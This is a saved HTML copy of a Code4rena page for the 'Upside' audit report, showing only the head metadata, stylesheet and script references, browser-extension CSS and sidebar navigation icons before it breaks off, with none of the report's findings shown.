<!DOCTYPE html>
<!-- saved from url=(0044)https://code4rena.com/reports/2025-05-upside -->
<html lang="en" class="__variable_145019 __variable_7d3254 __variable_38ceec dark" style="background: var(--color__bg-l0); --wcm-color-fg-1: rgb(228,231,231); --wcm-color-fg-2: rgb(148,158,158); --wcm-color-fg-3: rgb(110,119,119); --wcm-color-bg-1: rgb(20,20,20); --wcm-color-bg-2: rgb(39,42,42); --wcm-color-bg-3: rgb(59,64,64); --wcm-color-overlay: rgba(255,255,255,0.1); --wcm-accent-color: #3396FF; --wcm-accent-fill-color: #FFFFFF; --wcm-z-index: 89; --wcm-background-color: #3396FF; --wcm-background-border-radius: 8px; --wcm-container-border-radius: 30px; --wcm-wallet-icon-border-radius: 15px; --wcm-wallet-icon-large-border-radius: 30px; --wcm-wallet-icon-small-border-radius: 7px; --wcm-input-border-radius: 28px; --wcm-button-border-radius: 10px; --wcm-notification-border-radius: 36px; --wcm-secondary-button-border-radius: 28px; --wcm-icon-button-border-radius: 50%; --wcm-button-hover-highlight-border-radius: 10px; --wcm-text-big-bold-size: 20px; --wcm-text-big-bold-weight: 600; --wcm-text-big-bold-line-height: 24px; --wcm-text-big-bold-letter-spacing: -0.03em; --wcm-text-big-bold-text-transform: none; --wcm-text-xsmall-bold-size: 10px; --wcm-text-xsmall-bold-weight: 700; --wcm-text-xsmall-bold-line-height: 12px; --wcm-text-xsmall-bold-letter-spacing: 0.02em; --wcm-text-xsmall-bold-text-transform: uppercase; --wcm-text-xsmall-regular-size: 12px; --wcm-text-xsmall-regular-weight: 600; --wcm-text-xsmall-regular-line-height: 14px; --wcm-text-xsmall-regular-letter-spacing: -0.03em; --wcm-text-xsmall-regular-text-transform: none; --wcm-text-small-thin-size: 14px; --wcm-text-small-thin-weight: 500; --wcm-text-small-thin-line-height: 16px; --wcm-text-small-thin-letter-spacing: -0.03em; --wcm-text-small-thin-text-transform: none; --wcm-text-small-regular-size: 14px; --wcm-text-small-regular-weight: 600; --wcm-text-small-regular-line-height: 16px; --wcm-text-small-regular-letter-spacing: -0.03em; --wcm-text-small-regular-text-transform: none; --wcm-text-medium-regular-size: 16px; --wcm-text-medium-regular-weight: 600; --wcm-text-medium-regular-line-height: 20px; --wcm-text-medium-regular-letter-spacing: -0.03em; --wcm-text-medium-regular-text-transform: none; --wcm-font-family: -apple-system, system-ui, BlinkMacSystemFont, &#39;Segoe UI&#39;, Roboto, Ubuntu, &#39;Helvetica Neue&#39;, sans-serif; --wcm-font-feature-settings: &#39;tnum&#39; on, &#39;lnum&#39; on, &#39;case&#39; on; --wcm-success-color: rgb(38,181,98); --wcm-error-color: rgb(242, 90, 103); --wcm-overlay-background-color: rgba(0, 0, 0, 0.3); --wcm-overlay-backdrop-filter: none;"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="stylesheet" href="./Upside_files/aa1e03632b0a9f00.css" data-precedence="next"><link rel="stylesheet" href="./Upside_files/2c612863d5a616cb.css" data-precedence="next"><link rel="preload" as="script" fetchpriority="low" href="./Upside_files/webpack-ee83ff9cf0b0c89c.js.download"><script src="./Upside_files/fd9d1056-eb8d5211d3c9c065.js.download" async=""></script><script src="./Upside_files/2117-a3b19a97c1cb31ce.js.download" async=""></script><script src="./Upside_files/main-app-3138c406eafafcb7.js.download" async=""></script><script src="./Upside_files/2972-f84899d403fe0acb.js.download" async=""></script><script src="./Upside_files/error-337d8165658cb655.js.download" async=""></script><script src="./Upside_files/da2599a7-883aa94cd391c09d.js.download" async=""></script><script src="./Upside_files/aaea2bcf-7a609d2a8547b978.js.download" async=""></script><script src="./Upside_files/c16f53c3-1c73b34d2bc72b67.js.download" async=""></script><script src="./Upside_files/0815f603-89dbad4b5756c5c4.js.download" async=""></script><script src="./Upside_files/5878-bdbba189b5f619d7.js.download" async=""></script><script src="./Upside_files/1700-bbc1d97db9b9492c.js.download" async=""></script><script src="./Upside_files/2636-173262633c516a97.js.download" async=""></script><script src="./Upside_files/3504-22e800882144201d.js.download" async=""></script><script src="./Upside_files/4105-30871074ad2edc9d.js.download" async=""></script><script src="./Upside_files/6390-77d8d06791482011.js.download" async=""></script><script src="./Upside_files/6686-dd6382cfde9e8708.js.download" async=""></script><script src="./Upside_files/5813-7499623caf5cc29b.js.download" async=""></script><script src="./Upside_files/1638-db2c32ae38fcd41e.js.download" async=""></script><script src="./Upside_files/191-92b4f6645071a623.js.download" async=""></script><script src="./Upside_files/5028-123aa2d0fc9289a2.js.download" async=""></script><script src="./Upside_files/867-d827a4f529ecb777.js.download" async=""></script><script src="./Upside_files/7834-2536a8f829bd1d9d.js.download" async=""></script><script src="./Upside_files/layout-c054eff4d03ebbf2.js.download" async=""></script><script src="./Upside_files/not-found-c0beac80bd3674ca.js.download" async=""></script><script src="./Upside_files/page-220cafabfbe0a147.js.download" async=""></script><title>Upside</title><title>Code4rena | Keeping high severity bugs out of production</title><meta name="description" content="Top auditors compete to keep high severity bugs out of production. Start a public or private audit within 48 hours."><meta name="application-name" content="Code4rena | Keeping high severity bugs out of production"><meta property="og:title" content="Code4rena"><meta property="og:description" content="Code4rena is a competitive audit platform that finds more high-severity vulnerabilities, more quickly than any other auditing method."><meta property="og:site_name" content="Code4rena"><meta property="og:image" content="https://code4rena.com/images/c4/c4-og-v2.png"><meta property="og:type" content="website"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="Code4rena"><meta name="twitter:description" content="Code4rena is a competitive audit platform that finds more high-severity vulnerabilities, more quickly than any other auditing method."><meta name="twitter:image" content="https://code4rena.com/images/c4/c4-og-v2.png"><link rel="icon" href="https://code4rena.com/favicon.ico" type="image/x-icon" sizes="256x256"><link rel="icon" href="https://code4rena.com/logos/c4/c4-favicon-32.png"><link rel="apple-touch-icon" href="https://code4rena.com/logos/c4/apple-touch-icon.png"><meta name="next-size-adjust"><title>Upside</title><meta property="og:title" content="Upside"><meta name="twitter:title" content="Upside"><script src="./Upside_files/polyfills-42372ed130431b0a.js.download" nomodule=""></script><link rel="preload" href="https://code4rena.com/_next/static/media/9b7eb431f23ca42e-s.p.woff2" as="font" crossorigin="" type="font/woff2"><link rel="preload" href="https://code4rena.com/_next/static/media/b603571150b520e0-s.p.ttf" as="font" crossorigin="" type="font/ttf"><link rel="preload" href="https://code4rena.com/_next/static/media/d9396795aa5ec363-s.p.woff2" as="font" crossorigin="" type="font/woff2"><style id="mttstyle">
    #mttContainer {
      left: 0 !important;
      top: 0 !important;
      width: 1000px !important;
      margin: 0px !important;
      margin-left: -500px !important;
      position: fixed !important;
      z-index: 2147483647 !important; /* Maximum z-index to overcome overlays */
      background: none !important;
      pointer-events: none !important;
      display: inline-block !important;
      visibility: visible  !important;
      white-space: pre-line;
    }
    .tippy-box[data-theme~="custom"], .tippy-box[data-theme~="ocr"], .tippy-content *{
      font-size: 18px  !important;
      text-align: center !important;
      overflow-wrap: break-word !important;
      color: #ffffffff !important;
      font-family: 
        -apple-system, BlinkMacSystemFont,
        "Segoe UI", "Roboto", "Oxygen",
        "Ubuntu", "Cantarell", "Fira Sans",
        "Droid Sans", "Helvetica Neue", sans-serif  !important;
      white-space: pre-line;
    }
    .tippy-box[data-theme~="custom"]{
      max-width: 200px  !important;
      backdrop-filter: blur(6px) !important;
      background-color: #00000080 !important;
      border: 1px solid #ffffff00; 
      box-shadow: rgba(50, 50, 93, 0.25) 0px 2px 5px -1px, rgba(0, 0, 0, 0.3) 0px 1px 3px -1px;
      opacity: 1.0; /* Adjusted opacity for transparency */
    }
    .tippy-box[data-theme~="ocr"]{
      max-width: $1000px  !important;
      backdrop-filter: blur(6px) !important;
      background-color: #00000080 !important;
      border: 1px solid #ffffff00; 
      box-shadow: rgba(50, 50, 93, 0.25) 0px 2px 5px -1px, rgba(0, 0, 0, 0.3) 0px 1px 3px -1px;
      opacity: 1.0; /* Adjusted opacity for transparency */
    }
    .tippy-box[data-theme~="transparent"] {
      max-width: $1000px  !important;
      backdrop-filter: blur(6px) !important;
      background-color: #00000080 !important;
      border: 1px solid #ffffff00; 
      box-shadow: rgba(50, 50, 93, 0.25) 0px 2px 5px -1px, rgba(0, 0, 0, 0.3) 0px 1px 3px -1px;
      opacity: 0.0; /* Adjusted opacity for transparency */
      transition: opacity 0.3s ease-in-out; /* Added transition for opacity */
    }
    [data-tippy-root] {
      display: inline-block !important;
      visibility: visible  !important;
      position: absolute !important;
    }
    .tippy-box[data-theme~='custom'][data-placement^='top'] > .tippy-arrow::before, .tippy-box[data-theme~='ocr'][data-placement^='top'] > .tippy-arrow::before { 
      border-top-color: #00000080 !important;
    }
    .tippy-box[data-theme~='custom'][data-placement^='bottom'] > .tippy-arrow::before, .tippy-box[data-theme~='ocr'][data-placement^='bottom'] > .tippy-arrow::before {
      border-bottom-color: #00000080 !important;
    }
    .tippy-box[data-theme~='custom'][data-placement^='left'] > .tippy-arrow::before, .tippy-box[data-theme~='ocr'][data-placement^='left'] > .tippy-arrow::before {
      border-left-color: #00000080 !important;
    }
    .tippy-box[data-theme~='custom'][data-placement^='right'] > .tippy-arrow::before, .tippy-box[data-theme~='ocr'][data-placement^='right'] > .tippy-arrow::before {
      border-right-color: #00000080 !important;
    }

    .mtt-highlight{
      background-color: #21dc6d40  !important;
      position: absolute !important;   
      z-index: 2147483646 !important; /* Slightly lower than tooltip */
      pointer-events: none !important;
      display: inline !important;
      border-radius: 3px !important;
    }
    .mtt-image{
      width: 180px  !important;
      border-radius: 3px !important;
    }
    .ocr_text_div{
      position: absolute;
      opacity: 0.4;
      color: transparent !important;
      border: 2px solid CornflowerBlue;
      background: none !important;
      border-radius: 3px !important;
    }</style><style id="mttstyleSubtitle">
    #ytp-caption-window-container .ytp-caption-segment {
      cursor: text !important;
      user-select: text !important;
      font-family: 
      -apple-system, BlinkMacSystemFont,
      "Segoe UI", "Roboto", "Oxygen",
      "Ubuntu", "Cantarell", "Fira Sans",
      "Droid Sans", "Helvetica Neue", sans-serif  !important;
    }
    .caption-visual-line{
      display: flex  !important;
      align-items: stretch  !important;
      direction: ltr
    }
    .captions-text .caption-visual-line:first-of-type:after {
      content: '⣿⣿';
      border-radius: 3px !important;
      color: white !important;
      background: transparent !important;
      box-shadow: rgba(50, 50, 93, 0.25) 0px 30px 60px -12px inset, rgba(0, 0, 0, 0.3) 0px 18px 36px -18px inset;
      display: inline-block;
      vertical-align: top;
      opacity:0;
      transition: opacity 0.7s ease-in-out;
    }
    .ytp-caption-segment{
      color: white !important;
      text-shadow: 1px 1px 2px black !important;
      backdrop-filter: blur(3px) !important;
      background: rgba(8, 8, 8, 0.1)  !important;
    }
    .captions-text:hover .caption-visual-line:first-of-type:after {
      opacity:1;
    }
    .ytp-pause-overlay {
      display: none !important;
    }
    .ytp-expand-pause-overlay .caption-window {
      display: block !important;
    }
  </style></head><body><div class="wrapper__grid"><div class="Toastify"></div><div class="core-app"><div class="core-app--header-options--wrapper no-print"><button type="button" aria-controls="core_app_nav" aria-expanded="false" aria-label="Expand sidebar" class="core-app--hamburger"><svg class="core-app--hamburger--icon" width="24px" height="24px" viewBox="0 0 22 22" fill="none" xmlns="http://www.w3.org/2000/svg"><g id="menu"><g id="Vector"><path fill="var(--color__text-tertiary)" fill-rule="evenodd" clip-rule="evenodd" d="M2.99988 10.7333C2.99988 10.2362 3.40282 9.83325 3.89988 9.83325H18.5665C19.0636 9.83325 19.4665 10.2362 19.4665 10.7333C19.4665 11.2303 19.0636 11.6333 18.5665 11.6333H3.89988C3.40282 11.6333 2.99988 11.2303 2.99988 10.7333Z"></path><path fill="var(--color__text-tertiary)" fill-rule="evenodd" clip-rule="evenodd" d="M2.99988 5.23325C2.99988 4.7362 3.40282 4.33325 3.89988 4.33325H18.5665C19.0636 4.33325 19.4665 4.7362 19.4665 5.23325C19.4665 5.73031 19.0636 6.13325 18.5665 6.13325H3.89988C3.40282 6.13325 2.99988 5.73031 2.99988 5.23325Z"></path><path fill="var(--color__text-tertiary)" fill-rule="evenodd" clip-rule="evenodd" d="M2.99988 16.2333C2.99988 15.7362 3.40282 15.3333 3.89988 15.3333H18.5665C19.0636 15.3333 19.4665 15.7362 19.4665 16.2333C19.4665 16.7303 19.0636 17.1333 18.5665 17.1333H3.89988C3.40282 17.1333 2.99988 16.7303 2.99988 16.2333Z"></path></g></g></svg></button></div><div class="core-app--nav--wrapper no-print"><nav id="core_app_nav" class="core-app--nav collapsed-mobile"><header class="core-app--nav--header"><a class="logo-link-notification-trigger mobile-collapsed no-unread" aria-label="Navigate to home" href="https://code4rena.com/"><img alt="C4 Logo" loading="lazy" width="28" height="28" decoding="async" data-nimg="1" class="app--logo" style="color:transparent" src="./Upside_files/c4-logo-icon.svg"></a><button class="logo-button-notification-trigger no-unread" type="button" aria-controls="core_app_notifications_popup" aria-expanded="false" aria-label="Open notifications"><img alt="C4 Logo" loading="lazy" width="28" height="28" decoding="async" data-nimg="1" class="app--logo" style="color:transparent" src="./Upside_files/c4-logo-icon.svg"></button><button type="button" class="bell-notification--trigger" aria-controls="core_app_notifications_popup" aria-expanded="false" aria-label="Open notifications"><svg width="24px" height="24px" viewBox="0 0 22 22" fill="none" xmlns="http://www.w3.org/2000/svg"><path stroke="var(--color__text-primary)" d="M15.1333 8.33333C15.1333 7.18406 14.6768 6.08186 13.8641 5.2692C13.0515 4.45655 11.9493 4 10.8 4C9.65072 4 8.54852 4.45655 7.73586 5.2692C6.9232 6.08186 6.46665 7.18406 6.46665 8.33333C6.46665 13.3889 4.29999 14.8333 4.29999 14.8333H17.3C17.3 14.8333 15.1333 13.3889 15.1333 8.33333Z" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path><path stroke="var(--color__text-primary)" d="M12.0495 17.7223C11.9225 17.9412 11.7402 18.1229 11.521 18.2492C11.3017 18.3755 11.0531 18.442 10.8 18.442C10.547 18.442 10.2983 18.3755 10.0791 18.2492C9.85979 18.1229 9.67754 17.9412 9.55057 17.7223" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path></svg></button><button type="button" class="core-app--nav--mobile-collapsible" aria-controls="core_app_nav" aria-expanded="false" aria-label="Collapse sidebar"><svg width="24px" height="24px" viewBox="0 0 22 22" fill="none" xmlns="http://www.w3.org/2000/svg"><g><path fill="var(--color__text-primary)" fill-rule="evenodd" clip-rule="evenodd" d="M5.26351 5.2636C5.61498 4.91213 6.18483 4.91213 6.5363 5.2636L11.3999 10.1272L16.2635 5.2636C16.615 4.91213 17.1848 4.91213 17.5363 5.2636C17.8878 5.61508 17.8878 6.18492 17.5363 6.5364L12.6727 11.4L17.5363 16.2636C17.8878 16.6151 17.8878 17.1849 17.5363 17.5364C17.1848 17.8879 16.615 17.8879 16.2635 17.5364L11.3999 12.6728L6.5363 17.5364C6.18483 17.8879 5.61498 17.8879 5.26351 17.5364C4.91204 17.1849 4.91204 16.6151 5.26351 16.2636L10.1271 11.4L5.26351 6.5364C4.91204 6.18492 4.91204 5.61508 5.26351 5.2636Z"></path></g></svg></button></header><div class="core-app--nav--content"><section><ul class="core-app--nav--group"><li class="core-app--nav--link"><a aria-describedby="core-app--nav--tooltip" aria-label="News" href="https://code4rena.com/"><div class="logo-24"><img alt="News" loading="lazy" decoding="async" data-nimg="fill" style="position:absolute;height:100%;width:100%;left:0;top:0;right:0;bottom:0;color:transparent" src="./Upside_files/32.svg"></div><p class="core-app--link--label">News</p></a></li><li class="core-app--nav--link"><a aria-describedby="core-app--nav--tooltip" aria-label="Leaderboard" href="https://code4rena.com/leaderboard"><svg class="core-app--link--icon" width="24px" height="24px" viewBox="0 0 22 22" fill="none" xmlns="http://www.w3.org/2000/svg"><g><path fill="var(--color__text-tertiary)" fill-rule="evenodd" clip-rule="evenodd" d="M9.10789 3.09263C9.79177 1.63579 11.8639 1.63579 12.5477 3.09263L14.197 6.60605C14.2112 6.63621 14.2394 6.65734 14.2724 6.6624L18.0423 7.24182C19.5703 7.47667 20.1931 9.34094 19.1131 10.4471L16.3245 13.3031C16.3023 13.3259 16.2923 13.3578 16.2974 13.3891L16.9465 17.369C17.2019 18.9345 15.5399 20.1051 14.1518 19.3376L10.8762 17.5262C10.8461 17.5095 10.8095 17.5095 10.7794 17.5262L7.5038 19.3376C6.11573 20.1051 4.45379 18.9345 4.70913 17.369L5.35828 13.3891C5.36339 13.3578 5.35331 13.3259 5.33113 13.3031L2.54256 10.4471C1.4625 9.34094 2.08531 7.47667 3.61339 7.24182L7.38328 6.6624C7.41621 6.65734 7.44445 6.63621 7.45861 6.60605L9.10789 3.09263ZM10.7725 3.81389C10.7638 3.81911 10.7507 3.82897 10.7373 3.85751L9.08802 7.37093C8.81904 7.94393 8.28237 8.34535 7.65672 8.44151L3.88683 9.02092C3.85803 9.02535 3.84468 9.03447 3.83657 9.04159C3.82586 9.051 3.81435 9.0666 3.80717 9.08808C3.8 9.10955 3.79982 9.12894 3.80273 9.1429C3.80493 9.15347 3.81011 9.16878 3.83047 9.18962L6.61904 12.0456C7.0405 12.4773 7.23192 13.0834 7.1348 13.6789L6.48565 17.6588C6.48072 17.689 6.48571 17.7045 6.48993 17.714C6.49571 17.727 6.5075 17.743 6.52676 17.7566C6.54602 17.7702 6.5651 17.7759 6.57928 17.7769C6.58962 17.7777 6.60593 17.7772 6.63274 17.7624L9.90837 15.951C10.4805 15.6346 11.1751 15.6346 11.7473 15.951L15.0229 17.7624C15.0497 17.7772 15.066 17.7777 15.0764 17.7769C15.0905 17.7759 15.1096 17.7702 15.1289 17.7566C15.1481 17.743 15.1599 17.727 15.1657 17.714C15.1699 17.7045 15.1749 17.689 15.17 17.6588L14.5208 13.6789C14.4237 13.0834 14.6151 12.4773 15.0366 12.0456L17.8252 9.18962C17.8455 9.16878 17.8507 9.15347 17.8529 9.1429C17.8558 9.12894 17.8556 9.10955 17.8485 9.08808C17.8413 9.0666 17.8298 9.051 17.8191 9.04159C17.811 9.03447 17.7976 9.02535 17.7688 9.02092L13.9989 8.44151C13.3733 8.34535 12.8366 7.94393 12.5676 7.37093L10.9183 3.85751C10.9049 3.82897 10.8918 3.81911 10.8832 3.81389C10.8711 3.80655 10.8519 3.8 10.8278 3.8C10.8037 3.8 10.7846 3.80655 10.7725 3.81389Z"></path></g></svg><p class="core-app--link--label">Leaderboard</p></a></li><li class="core-app--nav--link"><a aria-describedby="core-app--nav--tooltip" aria-label="Submissions" href="https://code4rena.com/your-submissions"><svg class="core-app--link--icon" width="24px" height="24px" viewBox="0 0 22 22" fill="none" xmlns="http://www.w3.org/2000/svg"><g><g><path fill="var(--color__text-tertiary)" fill-rule="evenodd" clip-rule="evenodd" d="M6.54287 3C5.92151 3 5.32559 3.24684 4.88622 3.68621C4.44685 4.12558 4.20001 4.72149 4.20001 5.34286V17.0571C4.20001 17.6785 4.44685 18.2744 4.88622 18.7138C5.32559 19.1532 5.9215 19.4 6.54287 19.4H15.3286C15.9499 19.4 16.5459 19.1532 16.9852 18.7138C17.4246 18.2744 17.6714 17.6785 17.6714 17.0571V8.27143C17.6714 8.03842 17.5789 7.81495 17.4141 7.65018L13.0213 3.25733C12.8565 3.09256 12.633 3 12.4 3H6.54287ZM6.12871 4.92869C6.23855 4.81885 6.38753 4.75714 6.54287 4.75714H11.6679V8.27145C11.6679 8.6758 11.9957 9.0036 12.4 9.0036H15.9143V17.0571C15.9143 17.2125 15.8526 17.3615 15.7427 17.4713C15.6329 17.5811 15.4839 17.6429 15.3286 17.6429H6.54287C6.38753 17.6429 6.23855 17.5811 6.12871 17.4713C6.01886 17.3615 5.95716 17.2125 5.95716 17.0571V5.34286C5.95716 5.18752 6.01886 5.03854 6.12871 4.92869ZM14.8183 7.53931L13.1322 5.85323V7.53931H14.8183Z"></path><path fill="var(--color__text-tertiary)" fill-rule="evenodd" clip-rule="evenodd" d="M7.27501 11.9321C7.27501 11.5278 7.6028 11.2 8.00716 11.2H13.8643C14.2687 11.2 14.5964 11.5278 14.5964 11.9321C14.5964 12.3365 14.2687 12.6643 13.8643 12.6643H8.00716C7.6028 12.6643 7.27501 12.3365 7.27501 11.9321Z"></path><path fill="var(--color__text-tertiary)" fill-rule="evenodd" clip-rule="evenodd" d="M7.27501 14.8607C7.27501 14.4564 7.6028 14.1286 8.00716 14.1286H13.8643C14.2687 14.1286 14.5964 14.4564 14.5964 14.8607C14.5964 15.2651 14.2687 15.5929 13.8643 15.5929H8.00716C7.6028 15.5929 7.27501 15.2651 7.27501 14.8607Z"></path><path fill="var(--color__text-tertiary)" fill-rule="evenodd" clip-rule="evenodd" d="M7.27501 9.00357C7.27501 8.59922 7.6028 8.27143 8.00716 8.27143H9.47144C9.87579 8.27143 10.2036 8.59922 10.2036 9.00357C10.2036 9.40792 9.87579 9.73571 9.47144 9.73571H8.00716C7.6028 9.73571 7.27501 9.40792 7.27501 9.00357Z"></path></g></g></svg><p class="core-app--link--label">Submissions</p></a></li></ul></section><hr class="core-app--hr"><section><p class="core-app--nav--heading">Explore C4</p><ul class="core-app--nav--group"><li class="core-app--nav--link"><a aria-describedby="core-app--nav--tooltip" aria-label="Audits" href="https://code4rena.com/audits"><svg class="core-app--link--icon" width="24px" height="24px" viewBox="0 0 22 22" fill="none" xmlns="http://www.w3.org/2000/svg"><g><path fill="var(--color__text-tertiary)" fill-rule="evenodd" clip-rule="evenodd" d="M9.81977 3.31602C10.1791 3.10898 10.5866 3 11.0014 3C11.4161 3 11.8236 3.10898 12.1829 3.31602C12.1836 3.31638 12.1842 3.31675 12.1848 3.31711L17.3192 6.25104C17.6787 6.45858 17.9773 6.75701 18.185 7.11637C18.3927 7.47573 18.5023 7.8834 18.5027 8.29848V14.1673C18.5023 14.5823 18.3927 14.9909 18.185 15.3503C17.9773 15.7097 17.6787 16.0081 17.3192 16.2156L17.3158 16.2176L12.1848 19.1496C12.1842 19.1499 12.1835 19.1503 12.1829 19.1507C11.8236 19.3577 11.4161 19.4667 11.0014 19.4667C10.5866 19.4667 10.1792 19.3577 9.8198 19.1507C9.81916 19.1503 9.81851 19.1499 9.81787 19.1496L4.68696 16.2176L4.68348 16.2156C4.32402 16.0081 4.02544 15.7097 3.81772 15.3503C3.61 14.9909 3.50043 14.5833 3.5 14.1682L3.5 8.2994C3.50043 7.88432 3.61 7.47573 3.81772 7.11637C4.02544 6.75701 4.32402 6.45859 4.68348 6.25105L4.68695 6.24904L9.81977 3.31602ZM11.0014 4.8C10.9018 4.8 10.8041 4.8262 10.7179 4.87596L10.7144 4.87796L5.58214 7.81067C5.49664 7.86035 5.4256 7.93154 5.3761 8.01717C5.32641 8.10314 5.30016 8.20066 5.3 8.29996V14.1667C5.30016 14.266 5.32641 14.3635 5.3761 14.4495C5.4256 14.5351 5.49662 14.6063 5.58212 14.656C5.58257 14.6562 5.58303 14.6565 5.58348 14.6568L10.7179 17.5907C10.8041 17.6405 10.9018 17.6667 11.0014 17.6667C11.1009 17.6667 11.1986 17.6405 11.2848 17.5907L11.2883 17.5887L16.4192 14.6568C16.4197 14.6565 16.4201 14.6562 16.4206 14.656C16.5061 14.6063 16.5771 14.5351 16.6266 14.4495C16.6763 14.3636 16.7025 14.2662 16.7027 14.167C16.7027 14.1668 16.7027 14.1672 16.7027 14.167L16.7027 8.30032C16.7027 8.30012 16.7027 8.30052 16.7027 8.30032C16.7025 8.20111 16.6763 8.10307 16.6266 8.01717C16.5771 7.93154 16.5061 7.86036 16.4206 7.81068C16.4201 7.81042 16.4197 7.81015 16.4192 7.80989L11.2848 4.87597C11.1986 4.82621 11.1009 4.8 11.0014 4.8Z"></path></g></svg><p class="core-app--link--label">Audits</p></a></li><li class="core-app--nav--link"><a aria-describedby="core-app--nav--tooltip" aria-label="Bounties" href="https://code4rena.com/bounties"><svg width="24" height="24" xmlns="http://www.w3.org/2000/svg" fill="none" class="core-app--link--icon"><path fill-rule="evenodd" clip-rule="evenodd" d="M13.808 6.5083C14.984 6.5086 16.1117 6.97597 16.9431 7.80763C17.7746 8.63929 18.2417 9.76714 18.2417 10.9431V13.75C18.2417 14.701 18.0544 15.6426 17.6904 16.5212C17.3265 17.3998 16.7931 18.1981 16.1206 18.8706C15.4482 19.543 14.6499 20.0765 13.7713 20.4404C12.8927 20.8043 11.951 20.9916 11 20.9916C10.049 20.9916 9.10733 20.8043 8.22873 20.4404C7.35013 20.0765 6.55182 19.543 5.87937 18.8706C5.20692 18.1981 4.6735 17.3998 4.30957 16.5212C3.94564 15.6426 3.75833 14.701 3.75833 13.75V10.9431C3.75833 9.76733 4.22526 8.63966 5.05647 7.80803C5.88767 6.9764 7.01511 6.5089 8.19091 6.5083L13.808 6.5083ZM8.19175 8.1583C8.1917 8.1583 8.19165 8.1583 8.19161 8.1583C8.19151 8.1583 8.19142 8.1583 8.19133 8.1583C7.45314 8.15879 6.74534 8.45234 6.22349 8.97446C5.70154 9.49668 5.40833 10.2048 5.40833 10.9431V13.75C5.40833 14.4843 5.55296 15.2114 5.83397 15.8898C6.11498 16.5682 6.52686 17.1846 7.04609 17.7039C7.56533 18.2231 8.18175 18.635 8.86016 18.916C9.53857 19.197 10.2657 19.3416 11 19.3416C11.7343 19.3416 12.4614 19.197 13.1398 18.916C13.8182 18.635 14.4347 18.2231 14.9539 17.7039C15.4731 17.1846 15.885 16.5682 16.166 15.8898C16.447 15.2114 16.5917 14.4843 16.5917 13.75V10.9431C16.5917 10.2047 16.2984 9.49645 15.7763 8.97421C15.2542 8.45202 14.5461 8.15854 13.8077 8.1583M8.19175 8.1583H13.8075Z" fill="var(--color__text-tertiary)"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M7.49981 3.37487C8.42811 2.44657 9.68717 1.92505 11 1.92505C12.3128 1.92505 13.5719 2.44657 14.5002 3.37487C15.4285 4.30317 15.95 5.56223 15.95 6.87505V7.79171H14.3V6.87505C14.3 5.99983 13.9523 5.16047 13.3334 4.5416C12.7146 3.92273 11.8752 3.57505 11 3.57505C10.1248 3.57505 9.28541 3.92273 8.66654 4.5416C8.04767 5.16047 7.69999 5.99983 7.69999 6.87505V7.79171H6.04999V6.87505C6.04999 5.56223 6.5715 4.30317 7.49981 3.37487Z" fill="var(--color__text-tertiary)"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M2.44234 7.02688C2.61156 6.60383 3.09168 6.39806 3.51473 6.56728L5.34806 7.30062C5.77111 7.46983 5.97688 7.94996 5.80766 8.37301C5.63844 8.79605 5.15831 9.00182 4.73527 8.8326L2.90193 8.09927C2.47889 7.93005 2.27312 7.44993 2.44234 7.02688ZM19.5577 7.02688C19.7269 7.44993 19.5211 7.93005 19.0981 8.09927L17.2647 8.8326C16.8417 9.00182 16.3616 8.79605 16.1923 8.37301C16.0231 7.94996 16.2289 7.46983 16.6519 7.30062L18.4853 6.56728C18.9083 6.39806 19.3884 6.60383 19.5577 7.02688ZM1.00833 12.8333C1.00833 12.3776 1.3777 12.0083 1.83333 12.0083H4.58333C5.03897 12.0083 5.40833 12.3776 5.40833 12.8333C5.40833 13.2889 5.03897 13.6583 4.58333 13.6583H1.83333C1.3777 13.6583 1.00833 13.2889 1.00833 12.8333ZM16.5917 12.8333C16.5917 12.3776 16.961 12.0083 17.4167 12.0083H20.1667C20.6223 12.0083 20.9917 12.3776 20.9917 12.8333C20.9917 13.2889 20.6223 13.6583 20.1667 13.6583H17.4167C16.961 13.6583 16.5917 13.2889 16.5917 12.8333ZM11 12.9249C11.4556 12.9249 11.825 13.2943 11.825 13.7499V19.7083C11.825 20.1639 11.4556 20.5333 11 20.5333C10.5444 20.5333 10.175 20.1639 10.175 19.7083V13.7499C10.175 13.2943 10.5444 12.9249 11 12.9249ZM5.80766 17.2935C5.97688 17.7166 5.77111 18.1967 5.34806 18.3659L3.51473 19.0993C3.09168 19.2685 2.61156 19.0627 2.44234 18.6397C2.27312 18.2166 2.47889 17.7365 2.90193 17.5673L4.73527 16.834C5.15831 16.6647 5.63844 16.8705 5.80766 17.2935ZM16.1923 17.2935C16.3616 16.8705 16.8417 16.6647 17.2647 16.834L19.0981 17.5673C19.5211 17.7365 19.7269 18.2166 19.5577 18.6397C19.3884 19.0627 18.9083 19.2685 18.4853 19.0993L16.6519 18.3659C16.2289 18.1967 16.0231 17.7166 16.1923 17.2935Z" fill="var(--color__text-tertiary)"></path></svg><p class="core-app--link--label">Bounties</p></a></li><li class="core-app--nav--link"><a aria-describedby="core-app--nav--tooltip" aria-label="Reports" href="https://code4rena.com/reports"><svg class="core-app--link--icon" width="24px" height="24px" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><g><g><path fill="var(--color__text-tertiary)" fill-rule="evenodd" clip-rule="evenodd" d="M14.9389 4.07141H15.625C16.2956 4.07141 16.9111 4.37228 17.3448 4.86051C17.7752 5.34489 18 5.97903 18 6.61903V17.4524C18 18.0924 17.7752 18.7265 17.3448 19.2109C16.9111 19.6991 16.2956 20 15.625 20H7.375C6.70438 20 6.08893 19.6991 5.65516 19.2109C5.22481 18.7265 5 18.0924 5 17.4524V6.61903C5 5.97903 5.22481 5.34489 5.65516 4.86051C6.08893 4.37228 6.70438 4.07141 7.375 4.07141H8.06109C8.28105 3.34179 9.05005 3 9.625 3H13.375C13.9499 3 14.7189 3.34179 14.9389 4.07141ZM8.11306 6.07141H7.375C7.31628 6.07141 7.23225 6.09664 7.1503 6.18888C7.06492 6.28497 7 6.43812 7 6.61903V17.4524C7 17.6333 7.06492 17.7864 7.1503 17.8825C7.23225 17.9748 7.31628 18 7.375 18H15.625C15.6837 18 15.7677 17.9748 15.8497 17.8825C15.9351 17.7864 16 17.6333 16 17.4524V6.61903C16 6.43812 15.9351 6.28498 15.8497 6.18888C15.7678 6.09664 15.6837 6.07141 15.625 6.07141H14.8869C14.6157 6.7029 13.911 7 13.375 